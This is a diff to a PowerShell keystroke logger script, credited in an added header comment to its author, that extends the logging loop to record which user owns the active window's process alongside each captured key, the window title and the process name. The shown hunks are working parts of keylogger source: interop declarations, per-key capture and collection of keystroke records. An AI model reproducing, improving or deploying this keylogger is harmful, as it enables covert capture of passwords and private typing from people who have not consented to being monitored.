@@ -1,3 +1,8 @@
+<#
+PowerShell keystroke logger by shima
+http://vacmf.org/2013/01/23/powershell-keylogger/
+#>
+
 Add-Type @"
     using System;
     using System.Runtime.InteropServices;
@@ -104,17 +109,22 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
                         Write-Error "Failed to get active Window details. More Info: $_"            
                     }
 
-                    $Process = Get-Process | ? {$_.MainWindowHandle -eq $activeHandle} 
+                    if ($ActiveHandle) {
+                        $Process = Get-Process | ? {$_.MainWindowHandle -eq $activeHandle} 
+                        $process_wmi = (Get-CimInstance Win32_Process -Filter "ProcessId = '$($process.id)'")
+                        $owner = Invoke-CimMethod -InputObject $process_wmi -MethodName GetOwner | select -ExpandProperty user
+                    }
       
                     
                     $info = @{
                         "Date" = Get-Date
                         "ProcessName" = if ($Process.Name) { $Process.Name } else { "Unknown" }
+                        "ProcessOwner" = if ($owner) { $owner } else { "Unknown" }
                         "MainWindowTitle" = if ($Process.MainWindowTitle) { $Process.MainWindowTitle } else { "Unknown" }
                         "KeyPressed" = $mychar.ToString()
                     }
 
-                    write-host "$($info.date) - Key [$($info.KeyPressed)] pressed within window [$($info.mainwindowtitle)] of process [$($info.processName)]."
+                    write-host "$($info.date) - Key [$($info.KeyPressed)] pressed by user [$($info.ProcessOwner)] with window [$($info.mainwindowtitle)] of process [$($info.processName)]."
 
                     $strokes += New-Object -TypeName PSObject -Property $info                                                    
 
